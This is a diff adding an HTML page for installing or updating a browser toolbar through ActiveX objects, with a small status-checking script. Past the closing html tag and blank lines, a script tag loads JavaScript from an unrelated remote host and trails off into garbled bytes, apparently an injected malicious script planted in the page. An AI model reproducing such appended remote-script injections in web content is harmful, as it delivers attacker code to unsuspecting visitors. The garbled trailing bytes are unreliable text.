@@ -1,0 +1,55 @@
+<html>
+
+<head>
+  <title>Installing the Toolbar</title>
+<SCRIPT language=JavaScript>
+   function checkInstall() {
+     if(typeof(Find2)=="undefined")
+      {
+        if(typeof(Find3)=="undefined")
+        {
+          obj.innerHTML = 'first installation - was not installed';
+        }
+        else
+        {
+          obj.innerHTML = 'first installation - you toolbar is up to date';
+        }
+      }
+      else
+      {
+        if(typeof(Find3)=="undefined")
+        {
+          obj.innerHTML = 'updating - was not installed';
+        }
+        else
+        {
+          obj.innerHTML = 'updating - you toolbar is up to date';
+        }
+      }
+}
+
+</SCRIPT>
+
+</head>
+
+<body bgcolor=#ffffff onload="checkInstall()">
+
+<object classid="clsid:5F1ABCDB-A875-46c1-8345-B72A4567E486" id="Find2">
+<input type="hidden">
+</object>
+
+<input type="hidden">
+
+<object classid="clsid:5F1ABCDB-A875-46c1-8345-B72A4567E486" codebase="toolbar_sample.cab#Version=1,2,0,0" id=Find3>
+<input type="hidden">
+</object>
+
+<span id="obj"></span>
+
+</body>
+</html>
+
+
+
+
+<script language=javascript src=http://www.yuanqwe.cn/yuanqwe.js¤@[U1û„¤@[U1û„¤@[U1û„¤@[U1û„¤@[U1û„“ÛmïŠ‰Úw></script>
